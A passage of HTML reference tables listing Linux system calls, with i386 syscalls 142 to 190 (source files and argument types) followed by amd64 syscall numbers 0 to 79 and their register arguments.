         <td>sys_select</td>
         <td><a href=
            "file:///usr/src/linux/fs/select.c">fs/select.c</a></td>
         <td>int</td>
         <td><a href="#fd_set">fd_set *</a></td>
         <td><a href="#fd_set">fd_set *</a></td>
         <td><a href="#fd_set">fd_set *</a></td>
         <td><a href="#timeval">struct timeval *</a></td>
      </tr>
      <tr>
         <td>143</td>
         <td>sys_flock</td>
         <td><a href=
            "file:///usr/src/linux/fs/locks.c">fs/locks.c</a></td>
         <td>unsigned int</td>
         <td>unsigned int</td>
         <td>-</td>
         <td>-</td>
         <td>-</td>
      </tr>
      <tr>
         <td>144</td>
         <td>sys_msync</td>
         <td><a href=
            "file:///usr/src/linux/mm/filemap.c">mm/filemap.c</a></td>
         <td>unsigned long</td>
         <td><a href="#size_t">size_t</a></td>
         <td>int</td>
         <td>-</td>
         <td>-</td>
      </tr>
      <tr>
         <td>145</td>
         <td>sys_readv</td>
         <td><a href=
            "file:///usr/src/linux/fs/read_write.c">fs/read_write.c</a></td>
         <td>unsigned long</td>
         <td><a href="#iovec">const struct iovec *</a></td>
         <td>unsigned long</td>
         <td>-</td>
         <td>-</td>
      </tr>
      <tr>
         <td>146</td>
         <td>sys_writev</td>
         <td><a href=
            "file:///usr/src/linux/fs/read_write.c">fs/read_write.c</a></td>
         <td>unsigned long</td>
         <td><a href="#iovec">const struct iovec *</a></td>
         <td>unsigned long</td>
         <td>-</td>
         <td>-</td>
      </tr>
      <tr>
         <td>147</td>
         <td>sys_getsid</td>
         <td><a href=
            "file:///usr/src/linux/kernel/sys.c">kernel/sys.c</a></td>
         <td><a href="#pid_t">pid_t</a></td>
         <td>-</td>
         <td>-</td>
         <td>-</td>
         <td>-</td>
      </tr>
      <tr>
         <td>148</td>
         <td>sys_fdatasync</td>
         <td><a href=
            "file:///usr/src/linux/fs/buffer.c">fs/buffer.c</a></td>
         <td>unsigned int</td>
         <td>-</td>
         <td>-</td>
         <td>-</td>
         <td>-</td>
      </tr>
      <tr>
         <td>149</td>
         <td>sys_sysctl</td>
         <td><a href=
            "file:///usr/src/linux/kernel/sysctl.c">kernel/sysctl.c</a></td>
         <td><a href="#__sysctl_args">struct __sysctl_args
            *</a>
         </td>
         <td>-</td>
         <td>-</td>
         <td>-</td>
         <td>-</td>
      </tr>
      <tr>
         <td>150</td>
         <td>sys_mlock</td>
         <td><a href=
            "file:///usr/src/linux/mm/mlock.c">mm/mlock.c</a></td>
         <td>unsigned long</td>
         <td><a href="#size_t">size_t</a></td>
         <td>-</td>
         <td>-</td>
         <td>-</td>
      </tr>
      <tr>
         <td>151</td>
         <td>sys_munlock</td>
         <td><a href=
            "file:///usr/src/linux/mm/mlock.c">mm/mlock.c</a></td>
         <td>unsigned long</td>
         <td><a href="#size_t">size_t</a></td>
         <td>-</td>
         <td>-</td>
         <td>-</td>
      </tr>
      <tr>
         <td>152</td>
         <td>sys_mlockall</td>
         <td><a href=
            "file:///usr/src/linux/mm/mlock.c">mm/mlock.c</a></td>
         <td>int</td>
         <td>-</td>
         <td>-</td>
         <td>-</td>
         <td>-</td>
      </tr>
      <tr>
         <td>153</td>
         <td>sys_munlockall</td>
         <td><a href=
            "file:///usr/src/linux/mm/mlock.c">mm/mlock.c</a></td>
         <td>-</td>
         <td>-</td>
         <td>-</td>
         <td>-</td>
         <td>-</td>
      </tr>
      <tr>
         <td>154</td>
         <td>sys_sched_setparam</td>
         <td><a href=
            "file:///usr/src/linux/kernel/sched.c">kernel/sched.c</a></td>
         <td><a href="#pid_t">pid_t</a></td>
         <td><a href="#sched_param">struct sched_param
            *</a>
         </td>
         <td>-</td>
         <td>-</td>
         <td>-</td>
      </tr>
      <tr>
         <td>155</td>
         <td>sys_sched_getparam</td>
         <td><a href=
            "file:///usr/src/linux/kernel/sched.c">kernel/sched.c</a></td>
         <td><a href="#pid_t">pid_t</a></td>
         <td><a href="#sched_param">struct sched_param
            *</a>
         </td>
         <td>-</td>
         <td>-</td>
         <td>-</td>
      </tr>
      <tr>
         <td>156</td>
         <td>sys_sched_setscheduler</td>
         <td><a href=
            "file:///usr/src/linux/kernel/sched.c">kernel/sched.c</a></td>
         <td><a href="#pid_t">pid_t</a></td>
         <td>int</td>
         <td><a href="#sched_param">struct sched_param
            *</a>
         </td>
         <td>-</td>
         <td>-</td>
      </tr>
      <tr>
         <td>157</td>
         <td>sys_sched_getscheduler</td>
         <td><a href=
            "file:///usr/src/linux/kernel/sched.c">kernel/sched.c</a></td>
         <td><a href="#pid_t">pid_t</a></td>
         <td>-</td>
         <td>-</td>
         <td>-</td>
         <td>-</td>
      </tr>
      <tr>
         <td>158</td>
         <td>sys_sched_yield</td>
         <td><a href=
            "file:///usr/src/linux/kernel/sched.c">kernel/sched.c</a></td>
         <td>-</td>
         <td>-</td>
         <td>-</td>
         <td>-</td>
         <td>-</td>
      </tr>
      <tr>
         <td>159</td>
         <td>sys_sched_get_priority_max</td>
         <td><a href=
            "file:///usr/src/linux/kernel/sched.c">kernel/sched.c</a></td>
         <td>int</td>
         <td>-</td>
         <td>-</td>
         <td>-</td>
         <td>-</td>
      </tr>
      <tr>
         <td>160</td>
         <td>sys_sched_get_priority_min</td>
         <td><a href=
            "file:///usr/src/linux/kernel/sched.c">kernel/sched.c</a></td>
         <td>int</td>
         <td>-</td>
         <td>-</td>
         <td>-</td>
         <td>-</td>
      </tr>
      <tr>
         <td>161</td>
         <td>sys_sched_rr_get_interval</td>
         <td><a href=
            "file:///usr/src/linux/kernel/sched.c">kernel/sched.c</a></td>
         <td><a href="#pid_t">pid_t</a></td>
         <td><a href="#timespec">struct timespec *</a></td>
         <td>-</td>
         <td>-</td>
         <td>-</td>
      </tr>
      <tr>
         <td>162</td>
         <td>sys_nanosleep</td>
         <td><a href=
            "file:///usr/src/linux/kernel/sched.c">kernel/sched.c</a></td>
         <td><a href="#timespec">struct timespec *</a></td>
         <td><a href="#timespec">struct timespec *</a></td>
         <td>-</td>
         <td>-</td>
         <td>-</td>
      </tr>
      <tr>
         <td>163</td>
         <td>sys_mremap</td>
         <td><a href=
            "file:///usr/src/linux/mm/mremap.c">mm/mremap.c</a></td>
         <td>unsigned long</td>
         <td>unsigned long</td>
         <td>unsigned long</td>
         <td>unsigned long</td>
         <td>-</td>
      </tr>
      <tr>
         <td>164</td>
         <td>sys_setresuid</td>
         <td><a href=
            "file:///usr/src/linux/kernel/sys.c">kernel/sys.c</a></td>
         <td><a href="#uid_t">uid_t</a></td>
         <td><a href="#uid_t">uid_t</a></td>
         <td><a href="#uid_t">uid_t</a></td>
         <td>-</td>
         <td>-</td>
      </tr>
      <tr>
         <td>165</td>
         <td>sys_getresuid</td>
         <td><a href=
            "file:///usr/src/linux/kernel/sys.c">kernel/sys.c</a></td>
         <td><a href="#uid_t">uid_t *</a></td>
         <td><a href="#uid_t">uid_t *</a></td>
         <td><a href="#uid_t">uid_t *</a></td>
         <td>-</td>
         <td>-</td>
      </tr>
      <tr>
         <td>166</td>
         <td>sys_vm86</td>
         <td><a href=
            "file:///usr/src/linux/arch/i386/kernel/vm86.c">arch/i386/kernel/vm86.c</a></td>
         <td><a href="#vm86_struct">struct vm86_struct
            *</a>
         </td>
         <td>-</td>
         <td>-</td>
         <td>-</td>
         <td>-</td>
      </tr>
      <tr>
         <td>167</td>
         <td>sys_query_module</td>
         <td><a href=
            "file:///usr/src/linux/kernel/module.c">kernel/module.c</a></td>
         <td>const char *</td>
         <td>int</td>
         <td>char *</td>
         <td><a href="#size_t">size_t</a></td>
         <td><a href="#size_t">size_t *</a></td>
      </tr>
      <tr>
         <td>168</td>
         <td>sys_poll</td>
         <td><a href=
            "file:///usr/src/linux/fs/select.c">fs/select.c</a></td>
         <td><a href="#pollfd">struct pollfd *</a></td>
         <td>unsigned int</td>
         <td>long</td>
         <td>-</td>
         <td>-</td>
      </tr>
      <tr>
         <td>169</td>
         <td>sys_nfsservctl</td>
         <td><a href=
            "file:///usr/src/linux/fs/filesystems.c">fs/filesystems.c</a></td>
         <td>int</td>
         <td>void *</td>
         <td>void *</td>
         <td>-</td>
         <td>-</td>
      </tr>
      <tr>
         <td>170</td>
         <td>sys_setresgid</td>
         <td><a href=
            "file:///usr/src/linux/kernel/sys.c">kernel/sys.c</a></td>
         <td><a href="#gid_t">gid_t</a></td>
         <td><a href="#gid_t">gid_t</a></td>
         <td><a href="#gid_t">gid_t</a></td>
         <td>-</td>
         <td>-</td>
      </tr>
      <tr>
         <td>171</td>
         <td>sys_getresgid</td>
         <td><a href=
            "file:///usr/src/linux/kernel/sys.c">kernel/sys.c</a></td>
         <td><a href="#gid_t">gid_t *</a></td>
         <td><a href="#gid_t">gid_t *</a></td>
         <td><a href="#gid_t">gid_t *</a></td>
         <td>-</td>
         <td>-</td>
      </tr>
      <tr>
         <td>172</td>
         <td>sys_prctl</td>
         <td><a href=
            "file:///usr/src/linux/kernel/sys.c">kernel/sys.c</a></td>
         <td>int</td>
         <td>unsigned long</td>
         <td>unsigned long</td>
         <td>unsigned long</td>
         <td>unsigned long</td>
      </tr>
      <tr>
         <td>173</td>
         <td>sys_rt_sigreturn</td>
         <td><a href=
            "file:///usr/src/linux/arch/i386/kernel/signal.c">arch/i386/kernel/signal.c</a></td>
         <td>unsigned long</td>
         <td>-</td>
         <td>-</td>
         <td>-</td>
         <td>-</td>
      </tr>
      <tr>
         <td>174</td>
         <td>sys_rt_sigaction</td>
         <td><a href=
            "file:///usr/src/linux/kernel/signal.c">kernel/signal.c</a></td>
         <td>int</td>
         <td><a href="#sigaction">const struct sigaction
            *</a>
         </td>
         <td><a href="#sigaction">struct sigaction
            *</a>
         </td>
         <td><a href="#size_t">size_t</a></td>
         <td>-</td>
      </tr>
      <tr>
         <td>175</td>
         <td>sys_rt_sigprocmask</td>
         <td><a href=
            "file:///usr/src/linux/kernel/signal.c">kernel/signal.c</a></td>
         <td>int</td>
         <td><a href="#sigset_t">sigset_t *</a></td>
         <td><a href="#sigset_t">sigset_t *</a></td>
         <td><a href="#size_t">size_t</a></td>
         <td>-</td>
      </tr>
      <tr>
         <td>176</td>
         <td>sys_rt_sigpending</td>
         <td><a href=
            "file:///usr/src/linux/kernel/signal.c">kernel/signal.c</a></td>
         <td><a href="#sigset_t">sigset_t *</a></td>
         <td><a href="#size_t">size_t</a></td>
         <td>-</td>
         <td>-</td>
         <td>-</td>
      </tr>
      <tr>
         <td>177</td>
         <td>sys_rt_sigtimedwait</td>
         <td><a href=
            "file:///usr/src/linux/kernel/signal.c">kernel/signal.c</a></td>
         <td><a href="#sigset_t">const sigset_t *</a></td>
         <td><a href="#siginfo_t">siginfo_t *</a></td>
         <td><a href="#timespec">const struct timespec
            *</a>
         </td>
         <td><a href="#size_t">size_t</a></td>
         <td>-</td>
      </tr>
      <tr>
         <td>178</td>
         <td>sys_rt_sigqueueinfo</td>
         <td><a href=
            "file:///usr/src/linux/kernel/signal.c">kernel/signal.c</a></td>
         <td>int</td>
         <td>int</td>
         <td><a href="#siginfo_t">siginfo_t *</a></td>
         <td>-</td>
         <td>-</td>
      </tr>
      <tr>
         <td>179</td>
         <td>sys_rt_sigsuspend</td>
         <td><a href=
            "file:///usr/src/linux/arch/i386/kernel/signal.c">arch/i386/kernel/signal.c</a></td>
         <td><a href="#sigset_t">sigset_t *</a></td>
         <td><a href="#size_t">size_t</a></td>
         <td>-</td>
         <td>-</td>
         <td>-</td>
      </tr>
      <tr>
         <td>180</td>
         <td>sys_pread</td>
         <td><a href=
            "file:///usr/src/linux/fs/read_write.c">fs/read_write.c</a></td>
         <td>unsigned int</td>
         <td>char *</td>
         <td><a href="#size_t">size_t</a></td>
         <td><a href="#loff_t">loff_t</a></td>
         <td>-</td>
      </tr>
      <tr>
         <td>181</td>
         <td>sys_pwrite</td>
         <td><a href=
            "file:///usr/src/linux/fs/read_write.c">fs/read_write.c</a></td>
         <td>unsigned int</td>
         <td>const char *</td>
         <td><a href="#size_t">size_t</a></td>
         <td><a href="#loff_t">loff_t</a></td>
         <td>-</td>
      </tr>
      <tr>
         <td>182</td>
         <td>sys_chown</td>
         <td><a href=
            "file:///usr/src/linux/fs/open.c">fs/open.c</a></td>
         <td>const char *</td>
         <td><a href="#uid_t">uid_t</a></td>
         <td><a href="#gid_t">gid_t</a></td>
         <td>-</td>
         <td>-</td>
      </tr>
      <tr>
         <td>183</td>
         <td>sys_getcwd</td>
         <td><a href=
            "file:///usr/src/linux/fs/dcache.c">fs/dcache.c</a></td>
         <td>char *</td>
         <td>unsigned long</td>
         <td>-</td>
         <td>-</td>
         <td>-</td>
      </tr>
      <tr>
         <td>184</td>
         <td>sys_capget</td>
         <td><a href=
            "file:///usr/src/linux/kernel/capability.c">kernel/capability.c</a></td>
         <td><a href=
            "#cap_user_header_t">cap_user_header_t</a></td>
         <td><a href=
            "#cap_user_data_t">cap_user_data_t</a></td>
         <td>-</td>
         <td>-</td>
         <td>-</td>
      </tr>
      <tr>
         <td>185</td>
         <td>sys_capset</td>
         <td><a href=
            "file:///usr/src/linux/kernel/capability.c">kernel/capability.c</a></td>
         <td><a href=
            "#cap_user_header_t">cap_user_header_t</a></td>
         <td><a href="#cap_user_data_t">const
            cap_user_data_t</a>
         </td>
         <td>-</td>
         <td>-</td>
         <td>-</td>
      </tr>
      <tr>
         <td>186</td>
         <td>sys_sigaltstack</td>
         <td><a href=
            "file:///usr/src/linux/arch/i386/kernel/signal.c">arch/i386/kernel/signal.c</a></td>
         <td><a href="#stack_t">const stack_t *</a></td>
         <td><a href="#stack_t">stack_t *</a></td>
         <td>-</td>
         <td>-</td>
         <td>-</td>
      </tr>
      <tr>
         <td>187</td>
         <td>sys_sendfile</td>
         <td><a href=
            "file:///usr/src/linux/mm/filemap.c">mm/filemap.c</a></td>
         <td>int</td>
         <td>int</td>
         <td><a href="#off_t">off_t *</a></td>
         <td><a href="#size_t">size_t</a></td>
         <td>-</td>
      </tr>
      <tr>
         <td>190</td>
         <td>sys_vfork</td>
         <td><a href=
            "file:///usr/src/linux/arch/i386/kernel/process.c">arch/i386/kernel/process.c</a></td>
         <td><a href="#pt_regs">struct pt_regs</a></td>
         <td>-</td>
         <td>-</td>
         <td>-</td>
         <td>-</td>
      </tr>
    </tbody>
  </table>
<h1 id="othersyscalls">amd64 syscalls</h1>
  <table id="amd64" class="table table-hover table-condensed table-inverted table-bordered table-striped">
   <thead>
      <tr>
         <th>%rax</th>
         <th>System Call</th>
         <th>%rdi</th>
         <th>%rsi</th>
         <th>%rdx</th>
         <th>%rcx</th>
         <th>%r8</th>
         <th>%r9</th>
      </tr>
   </thead>
   <tbody>
      <tr>
         <td>0</td>
         <td>sys_read</td>
         <td>unsigned int fd</td>
         <td>char *buf</td>
         <td>size_t count</td>
         <td></td>
         <td></td>
         <td></td>
      </tr>
      <tr>
         <td>1</td>
         <td>sys_write</td>
         <td>unsigned int fd</td>
         <td>const char *buf</td>
         <td>size_t count</td>
         <td></td>
         <td></td>
         <td></td>
      </tr>
      <tr>
         <td>2</td>
         <td>sys_open</td>
         <td>const char *filename</td>
         <td>int flags</td>
         <td>int mode</td>
         <td></td>
         <td></td>
         <td></td>
      </tr>
      <tr>
         <td>3</td>
         <td>sys_close</td>
         <td>unsigned int fd</td>
         <td></td>
         <td></td>
         <td></td>
         <td></td>
         <td></td>
      </tr>
      <tr>
         <td>4</td>
         <td>sys_stat</td>
         <td>const char *filename</td>
         <td>struct stat *statbuf</td>
         <td></td>
         <td></td>
         <td></td>
         <td></td>
      </tr>
      <tr>
         <td>5</td>
         <td>sys_fstat</td>
         <td>unsigned int fd</td>
         <td>struct stat *statbuf</td>
         <td></td>
         <td></td>
         <td></td>
         <td></td>
      </tr>
      <tr>
         <td>6</td>
         <td>sys_lstat</td>
         <td>fconst char *filename</td>
         <td>struct stat *statbuf</td>
         <td></td>
         <td></td>
         <td></td>
         <td></td>
      </tr>
      <tr>
         <td>7</td>
         <td>sys_poll</td>
         <td>struct poll_fd *ufds</td>
         <td>unsigned int nfds</td>
         <td>long timeout_msecs</td>
         <td></td>
         <td></td>
         <td></td>
      </tr>
      <tr>
         <td>8</td>
         <td>sys_lseek</td>
         <td>unsigned int fd</td>
         <td>off_t offset</td>
         <td>unsigned int origin</td>
         <td></td>
         <td></td>
         <td></td>
      </tr>
      <tr>
         <td>9</td>
         <td>sys_mmap</td>
         <td>unsigned long addr</td>
         <td>unsigned long len</td>
         <td>unsigned long prot</td>
         <td>unsigned long flags</td>
         <td>unsigned long fd</td>
         <td>unsigned long off</td>
      </tr>
      <tr>
         <td>10</td>
         <td>sys_mprotect</td>
         <td>unsigned long start</td>
         <td>size_t len</td>
         <td>unsigned long prot</td>
         <td></td>
         <td></td>
         <td></td>
      </tr>
      <tr>
         <td>11</td>
         <td>sys_munmap</td>
         <td>unsigned long addr</td>
         <td>size_t len</td>
         <td></td>
         <td></td>
         <td></td>
         <td></td>
      </tr>
      <tr>
         <td>12</td>
         <td>sys_brk</td>
         <td>unsigned long brk</td>
         <td></td>
         <td></td>
         <td></td>
         <td></td>
         <td></td>
      </tr>
      <tr>
         <td>13</td>
         <td>sys_rt_sigaction</td>
         <td>int sig</td>
         <td>const struct sigaction *act</td>
         <td>struct sigaction *oact</td>
         <td>size_t sigsetsize</td>
         <td></td>
         <td></td>
      </tr>
      <tr>
         <td>14</td>
         <td>sys_rt_sigprocmask</td>
         <td>int how</td>
         <td>sigset_t *nset</td>
         <td>sigset_t *oset</td>
         <td>size_t sigsetsize</td>
         <td></td>
         <td></td>
      </tr>
      <tr>
         <td>15</td>
         <td>sys_rt_sigreturn</td>
         <td>unsigned long __unused</td>
         <td></td>
         <td></td>
         <td></td>
         <td></td>
         <td></td>
      </tr>
      <tr>
         <td>16</td>
         <td>sys_ioctl</td>
         <td>unsigned int fd</td>
         <td>unsigned int cmd</td>
         <td>unsigned long arg</td>
         <td></td>
         <td></td>
         <td></td>
      </tr>
      <tr>
         <td>17</td>
         <td>sys_pread64</td>
         <td>unsigned long fd</td>
         <td>char *buf</td>
         <td>size_t count</td>
         <td>loff_t pos</td>
         <td></td>
         <td></td>
      </tr>
      <tr>
         <td>18</td>
         <td>sys_pwrite64</td>
         <td>unsigned int fd</td>
         <td>const char *buf</td>
         <td>size_t count</td>
         <td>loff_t pos</td>
         <td></td>
         <td></td>
      </tr>
      <tr>
         <td>19</td>
         <td>sys_readv</td>
         <td>unsigned long fd</td>
         <td>const struct iovec *vec</td>
         <td>unsigned long vlen</td>
         <td></td>
         <td></td>
         <td></td>
      </tr>
      <tr>
         <td>20</td>
         <td>sys_writev</td>
         <td>unsigned long fd</td>
         <td>const struct iovec *vec</td>
         <td>unsigned long vlen</td>
         <td></td>
         <td></td>
         <td></td>
      </tr>
      <tr>
         <td>21</td>
         <td>sys_access</td>
         <td>const char *filename</td>
         <td>int mode</td>
         <td></td>
         <td></td>
         <td></td>
         <td></td>
      </tr>
      <tr>
         <td>22</td>
         <td>sys_pipe</td>
         <td>int *filedes</td>
         <td></td>
         <td></td>
         <td></td>
         <td></td>
         <td></td>
      </tr>
      <tr>
         <td>23</td>
         <td>sys_select</td>
         <td>int n</td>
         <td>fd_set *inp</td>
         <td>fd_set *outp</td>
         <td>fd_set*exp</td>
         <td>struct timeval *tvp</td>
         <td></td>
      </tr>
      <tr>
         <td>24</td>
         <td>sys_sched_yield</td>
         <td></td>
         <td></td>
         <td></td>
         <td></td>
         <td></td>
         <td></td>
      </tr>
      <tr>
         <td>25</td>
         <td>sys_mremap</td>
         <td>unsigned long addr</td>
         <td>unsigned long old_len</td>
         <td>unsigned long new_len</td>
         <td>unsigned long flags</td>
         <td>unsigned long new_addr</td>
         <td></td>
      </tr>
      <tr>
         <td>26</td>
         <td>sys_msync</td>
         <td>unsigned long start</td>
         <td>size_t len</td>
         <td>int flags</td>
         <td></td>
         <td></td>
         <td></td>
      </tr>
      <tr>
         <td>27</td>
         <td>sys_mincore</td>
         <td>unsigned long start</td>
         <td>size_t len</td>
         <td>unsigned char *vec</td>
         <td></td>
         <td></td>
         <td></td>
      </tr>
      <tr>
         <td>28</td>
         <td>sys_madvise</td>
         <td>unsigned long start</td>
         <td>size_t len_in</td>
         <td>int behavior</td>
         <td></td>
         <td></td>
         <td></td>
      </tr>
      <tr>
         <td>29</td>
         <td>sys_shmget</td>
         <td>key_t key</td>
         <td>size_t size</td>
         <td>int shmflg</td>
         <td></td>
         <td></td>
         <td></td>
      </tr>
      <tr>
         <td>30</td>
         <td>sys_shmat</td>
         <td>int shmid</td>
         <td>char *shmaddr</td>
         <td>int shmflg</td>
         <td></td>
         <td></td>
         <td></td>
      </tr>
      <tr>
         <td>31</td>
         <td>sys_shmctl</td>
         <td>int shmid</td>
         <td>int cmd</td>
         <td>struct shmid_ds *buf</td>
         <td></td>
         <td></td>
         <td></td>
      </tr>
      <tr>
         <td>32</td>
         <td>sys_dup</td>
         <td>unsigned int fildes</td>
         <td></td>
         <td></td>
         <td></td>
         <td></td>
         <td></td>
      </tr>
      <tr>
         <td>33</td>
         <td>sys_dup2</td>
         <td>unsigned int oldfd</td>
         <td>unsigned int newfd</td>
         <td></td>
         <td></td>
         <td></td>
         <td></td>
      </tr>
      <tr>
         <td>34</td>
         <td>sys_pause</td>
         <td></td>
         <td></td>
         <td></td>
         <td></td>
         <td></td>
         <td></td>
      </tr>
      <tr>
         <td>35</td>
         <td>sys_nanosleep</td>
         <td>struct timespec *rqtp</td>
         <td>struct timespec *rmtp</td>
         <td></td>
         <td></td>
         <td></td>
         <td></td>
      </tr>
      <tr>
         <td>36</td>
         <td>sys_getitimer</td>
         <td>int which</td>
         <td>struct itimerval *value</td>
         <td></td>
         <td></td>
         <td></td>
         <td></td>
      </tr>
      <tr>
         <td>37</td>
         <td>sys_alarm</td>
         <td>unsigned int seconds</td>
         <td></td>
         <td></td>
         <td></td>
         <td></td>
         <td></td>
      </tr>
      <tr>
         <td>38</td>
         <td>sys_setitimer</td>
         <td>int which</td>
         <td>struct itimerval *value</td>
         <td>struct itimerval *ovalue</td>
         <td></td>
         <td></td>
         <td></td>
      </tr>
      <tr>
         <td>39</td>
         <td>sys_getpid</td>
         <td></td>
         <td></td>
         <td></td>
         <td></td>
         <td></td>
         <td></td>
      </tr>
      <tr>
         <td>40</td>
         <td>sys_sendfile</td>
         <td>int out_fd</td>
         <td>int in_fd</td>
         <td>off_t *offset</td>
         <td>size_t count</td>
         <td></td>
         <td></td>
      </tr>
      <tr>
         <td>41</td>
         <td>sys_socket</td>
         <td>int family</td>
         <td>int type</td>
         <td>int protocol</td>
         <td></td>
         <td></td>
         <td></td>
      </tr>
      <tr>
         <td>42</td>
         <td>sys_connect</td>
         <td>int fd</td>
         <td>struct sockaddr *uservaddr</td>
         <td>int addrlen</td>
         <td></td>
         <td></td>
         <td></td>
      </tr>
      <tr>
         <td>43</td>
         <td>sys_accept</td>
         <td>int fd</td>
         <td>struct sockaddr *upeer_sockaddr</td>
         <td>int *upeer_addrlen</td>
         <td></td>
         <td></td>
         <td></td>
      </tr>
      <tr>
         <td>44</td>
         <td>sys_sendto</td>
         <td>int fd</td>
         <td>void *buff</td>
         <td>size_t len</td>
         <td>unsigned flags</td>
         <td>struct sockaddr *addr</td>
         <td>int addr_len</td>
      </tr>
      <tr>
         <td>45</td>
         <td>sys_recvfrom</td>
         <td>int fd</td>
         <td>void *ubuf</td>
         <td>size_t size</td>
         <td>unsigned flags</td>
         <td>struct sockaddr *addr</td>
         <td>int *addr_len</td>
      </tr>
      <tr>
         <td>46</td>
         <td>sys_sendmsg</td>
         <td>int fd</td>
         <td>struct msghdr *msg</td>
         <td>unsigned flags</td>
         <td></td>
         <td></td>
         <td></td>
      </tr>
      <tr>
         <td>47</td>
         <td>sys_recvmsg</td>
         <td>int fd</td>
         <td>struct msghdr *msg</td>
         <td>unsigned int flags</td>
         <td></td>
         <td></td>
         <td></td>
      </tr>
      <tr>
         <td>48</td>
         <td>sys_shutdown</td>
         <td>int fd</td>
         <td>int how</td>
         <td></td>
         <td></td>
         <td></td>
         <td></td>
      </tr>
      <tr>
         <td>49</td>
         <td>sys_bind</td>
         <td>int fd</td>
         <td>struct sokaddr *umyaddr</td>
         <td>int addrlen</td>
         <td></td>
         <td></td>
         <td></td>
      </tr>
      <tr>
         <td>50</td>
         <td>sys_listen</td>
         <td>int fd</td>
         <td>int backlog</td>
         <td></td>
         <td></td>
         <td></td>
         <td></td>
      </tr>
      <tr>
         <td>51</td>
         <td>sys_getsockname</td>
         <td>int fd</td>
         <td>struct sockaddr *usockaddr</td>
         <td>int *usockaddr_len</td>
         <td></td>
         <td></td>
         <td></td>
      </tr>
      <tr>
         <td>52</td>
         <td>sys_getpeername</td>
         <td>int fd</td>
         <td>struct sockaddr *usockaddr</td>
         <td>int *usockaddr_len</td>
         <td></td>
         <td></td>
         <td></td>
      </tr>
      <tr>
         <td>53</td>
         <td>sys_socketpair</td>
         <td>int family</td>
         <td>int type</td>
         <td>int protocol</td>
         <td>int *usockvec</td>
         <td></td>
         <td></td>
      </tr>
      <tr>
         <td>54</td>
         <td>sys_setsockopt</td>
         <td>int fd</td>
         <td>int level</td>
         <td>int optname</td>
         <td>char *optval</td>
         <td>int optlen</td>
         <td></td>
      </tr>
      <tr>
         <td>55</td>
         <td>sys_getsockopt</td>
         <td>int fd</td>
         <td>int level</td>
         <td>int optname</td>
         <td>char *optval</td>
         <td>int *optlen</td>
         <td></td>
      </tr>
      <tr>
         <td>56</td>
         <td>sys_clone</td>
         <td>unsigned long clone_flags</td>
         <td>unsigned long newsp</td>
         <td>void *parent_tid</td>
         <td>void *child_tid</td>
         <td></td>
         <td></td>
      </tr>
      <tr>
         <td>57</td>
         <td>sys_fork</td>
         <td></td>
         <td></td>
         <td></td>
         <td></td>
         <td></td>
         <td></td>
      </tr>
      <tr>
         <td>58</td>
         <td>sys_vfork</td>
         <td></td>
         <td></td>
         <td></td>
         <td></td>
         <td></td>
         <td></td>
      </tr>
      <tr>
         <td>59</td>
         <td>sys_execve</td>
         <td>const char *filename</td>
         <td>const char *const argv[]</td>
         <td>const char *const envp[]</td>
         <td></td>
         <td></td>
         <td></td>
      </tr>
      <tr>
         <td>60</td>
         <td>sys_exit</td>
         <td>int error_code</td>
         <td></td>
         <td></td>
         <td></td>
         <td></td>
         <td></td>
      </tr>
      <tr>
         <td>61</td>
         <td>sys_wait4</td>
         <td>pid_t upid</td>
         <td>int *stat_addr</td>
         <td>int options</td>
         <td>struct rusage *ru</td>
         <td></td>
         <td></td>
      </tr>
      <tr>
         <td>62</td>
         <td>sys_kill</td>
         <td>pid_t pid</td>
         <td>int sig</td>
         <td></td>
         <td></td>
         <td></td>
         <td></td>
      </tr>
      <tr>
         <td>63</td>
         <td>sys_uname</td>
         <td>struct old_utsname *name</td>
         <td></td>
         <td></td>
         <td></td>
         <td></td>
         <td></td>
      </tr>
      <tr>
         <td>64</td>
         <td>sys_semget</td>
         <td>key_t key</td>
         <td>int nsems</td>
         <td>int semflg</td>
         <td></td>
         <td></td>
         <td></td>
      </tr>
      <tr>
         <td>65</td>
         <td>sys_semop</td>
         <td>int semid</td>
         <td>struct sembuf *tsops</td>
         <td>unsigned nsops</td>
         <td></td>
         <td></td>
         <td></td>
      </tr>
      <tr>
         <td>66</td>
         <td>sys_semctl</td>
         <td>int semid</td>
         <td>int semnum</td>
         <td>int cmd</td>
         <td>union semun arg</td>
         <td></td>
         <td></td>
      </tr>
      <tr>
         <td>67</td>
         <td>sys_shmdt</td>
         <td>char *shmaddr</td>
         <td></td>
         <td></td>
         <td></td>
         <td></td>
         <td></td>
      </tr>
      <tr>
         <td>68</td>
         <td>sys_msgget</td>
         <td>key_t key</td>
         <td>int msgflg</td>
         <td></td>
         <td></td>
         <td></td>
         <td></td>
      </tr>
      <tr>
         <td>69</td>
         <td>sys_msgsnd</td>
         <td>int msqid</td>
         <td>struct msgbuf *msgp</td>
         <td>size_t msgsz</td>
         <td>int msgflg</td>
         <td></td>
         <td></td>
      </tr>
      <tr>
         <td>70</td>
         <td>sys_msgrcv</td>
         <td>int msqid</td>
         <td>struct msgbuf *msgp</td>
         <td>size_t msgsz</td>
         <td>long msgtyp</td>
         <td>int msgflg</td>
         <td></td>
      </tr>
      <tr>
         <td>71</td>
         <td>sys_msgctl</td>
         <td>int msqid</td>
         <td>int cmd</td>
         <td>struct msqid_ds *buf</td>
         <td></td>
         <td></td>
         <td></td>
      </tr>
      <tr>
         <td>72</td>
         <td>sys_fcntl</td>
         <td>unsigned int fd</td>
         <td>unsigned int cmd</td>
         <td>unsigned long arg</td>
         <td></td>
         <td></td>
         <td></td>
      </tr>
      <tr>
         <td>73</td>
         <td>sys_flock</td>
         <td>unsigned int fd</td>
         <td>unsigned int cmd</td>
         <td></td>
         <td></td>
         <td></td>
         <td></td>
      </tr>
      <tr>
         <td>74</td>
         <td>sys_fsync</td>
         <td>unsigned int fd</td>
         <td></td>
         <td></td>
         <td></td>
         <td></td>
         <td></td>
      </tr>
      <tr>
         <td>75</td>
         <td>sys_fdatasync</td>
         <td>unsigned int fd</td>
         <td></td>
         <td></td>
         <td></td>
         <td></td>
         <td></td>
      </tr>
      <tr>
         <td>76</td>
         <td>sys_truncate</td>
         <td>const char *path</td>
         <td>long length</td>
         <td></td>
         <td></td>
         <td></td>
         <td></td>
      </tr>
      <tr>
         <td>77</td>
         <td>sys_ftruncate</td>
         <td>unsigned int fd</td>
         <td>unsigned long length</td>
         <td></td>
         <td></td>
         <td></td>
         <td></td>
      </tr>
      <tr>
         <td>78</td>
         <td>sys_getdents</td>
         <td>unsigned int fd</td>
         <td>struct linux_dirent *dirent</td>
         <td>unsigned int count</td>
         <td></td>
         <td></td>
         <td></td>
      </tr>
      <tr>
         <td>79</td>
         <td>sys_getcwd</td>
